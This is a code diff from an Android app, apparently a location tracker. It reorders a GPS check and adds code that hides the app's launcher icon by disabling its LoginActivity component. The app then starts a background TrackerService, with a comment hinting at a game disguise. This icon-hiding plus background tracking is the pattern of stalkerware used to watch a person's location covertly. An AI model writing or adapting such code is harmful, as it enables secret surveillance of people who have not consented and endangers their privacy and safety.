@@ -2,6 +2,7 @@ package com.orizon.shashank_ayush.barcontra;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -19,6 +20,7 @@ import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.location.LocationSettingsResult;
 
+
 public class MainActivity extends Activity implements GoogleApiClient.OnConnectionFailedListener {
 
     private static final int PERMISSIONS_REQUEST = 1;
@@ -32,13 +34,6 @@ public class MainActivity extends Activity implements GoogleApiClient.OnConnecti
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Check GPS is enabled
-        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-            Toast.makeText(this, "Please enable GPS for better experience", Toast.LENGTH_SHORT).show();
-            finish();
-        }
-
         // Check location permission is granted - if it is, start
         // the service, otherwise request the permission
         int permission = ContextCompat.checkSelfPermission(this,
@@ -50,12 +45,29 @@ public class MainActivity extends Activity implements GoogleApiClient.OnConnecti
                     new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                     PERMISSIONS_REQUEST);
         }
+
+        // Check GPS is enabled
+        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+            Toast.makeText(this, "Please enable GPS for better experience", Toast.LENGTH_SHORT).show();
+
+            finish();
+        }
+
+
     }
 
-
-
     private void startTrackerService() {
+
+      //  startActivity(new Intent(this, BreakoutActivity.class));
+        Toast.makeText(this, "Please wait till the app is hidden", Toast.LENGTH_SHORT).show();
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, com.orizon.shashank_ayush.barcontra.LoginActivity.class);
+        // activity which is first time open in manifest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
         startService(new Intent(this, TrackerService.class));
+
         finish();//Game Redirect
     }
 
